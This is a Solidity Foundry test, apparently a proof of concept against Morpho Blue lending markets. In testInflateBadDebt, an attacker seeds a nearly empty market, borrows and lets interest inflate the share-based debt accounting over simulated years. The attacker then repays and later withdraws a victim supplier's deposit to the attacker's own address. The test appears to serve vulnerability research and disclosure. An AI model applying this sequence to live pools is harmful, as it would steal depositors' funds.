// SPDX-License-Identifier: None

// before running please
// 1. replace mock irm with real adaptive irm

pragma solidity ^0.8.0;

import "../lib/morpho-blue/test/forge/BaseTest.sol";

contract PoisonousPoolIntegrationTest is BaseTest {
    using MathLib for uint128;
    using MathLib for uint256;
    using SharesMathLib for uint256;
    using MarketParamsLib for MarketParams;
    using MorphoLib for IMorpho;
    using MorphoBalancesLib for IMorpho;

    int256 internal constant CURVE_STEEPNESS = 4 ether;
    int256 internal constant ADJUSTMENT_SPEED = int256(50 ether) / 365 days;
    int256 internal constant TARGET_UTILIZATION = 0.9 ether;
    int256 internal constant INITIAL_RATE_AT_TARGET = int256(0.01 ether) / 365 days;

    function setUp() public override {
        super.setUp();

        deployCodeTo(
            "AdaptiveCurveIrm.sol",
            abi.encode(address(morpho), CURVE_STEEPNESS, ADJUSTMENT_SPEED, TARGET_UTILIZATION, INITIAL_RATE_AT_TARGET),
            address(irm)
        );
    }

    function testInflateBadDebt() public {
        uint256 initialSupply = 0;

        if (initialSupply > 0) {
            loanToken.setBalance(address(this), initialSupply);
            morpho.supply(marketParams, initialSupply, 0, ONBEHALF, hex"");
        }

        uint256 supplied = initialSupply * 100 + 1;

        collateralToken.setBalance(address(this), type(uint128).max);
        morpho.supplyCollateral(marketParams, type(uint128).max, address(this), hex"");

        loanToken.setBalance(address(this), supplied);
        morpho.supply(marketParams, supplied, 0, address(this), hex"");
        morpho.borrow(marketParams, supplied, 0, address(this), address(this));

        Market memory market = morpho.market(marketParams.id());
        console2.log(
            "bad debt: %e",
            SharesMathLib.VIRTUAL_SHARES.toAssetsDown(market.totalBorrowAssets, market.totalBorrowShares)
                - SharesMathLib.VIRTUAL_ASSETS
        );

        for (uint256 i; i < 5; ++i) {
            skip(365 days);

            morpho.accrueInterest(marketParams);

            market = morpho.market(marketParams.id());
            console2.log(
                "bad debt: %e",
                SharesMathLib.VIRTUAL_SHARES.toAssetsDown(market.totalBorrowAssets, market.totalBorrowShares)
                    - SharesMathLib.VIRTUAL_ASSETS
            );
        }

        uint256 borrowed =
            (supplied * SharesMathLib.VIRTUAL_SHARES).toAssetsUp(market.totalBorrowAssets, market.totalBorrowShares);

        console2.log("collateral cost: %e", borrowed.wDivDown(marketParams.lltv));

        loanToken.setBalance(address(this), borrowed);
        morpho.repay(marketParams, 0, supplied * SharesMathLib.VIRTUAL_SHARES, address(this), hex"");
        morpho.withdrawCollateral(marketParams, type(uint128).max, address(this), address(this));

        for (uint256 i; i < 13; ++i) {
            skip(5 days);

            morpho.accrueInterest(marketParams);

            market = morpho.market(marketParams.id());
            console2.log("utilization: %e", market.totalBorrowAssets.wDivDown(market.totalSupplyAssets));
            console2.log(
                "bad debt: %e",
                SharesMathLib.VIRTUAL_SHARES.toAssetsDown(market.totalBorrowAssets, market.totalBorrowShares)
                    - SharesMathLib.VIRTUAL_ASSETS
            );
        }

        loanToken.setBalance(SUPPLIER, type(uint160).max);

        vm.prank(SUPPLIER);
        (uint256 assetsV, uint256 sharesV) = morpho.supply(marketParams, 0, 1e6, SUPPLIER, hex"");

        morpho.withdraw(marketParams, 0, 1e6, address(this), address(this));

        assertEq(loanToken.balanceOf(address(this)), borrowed);
    }
}
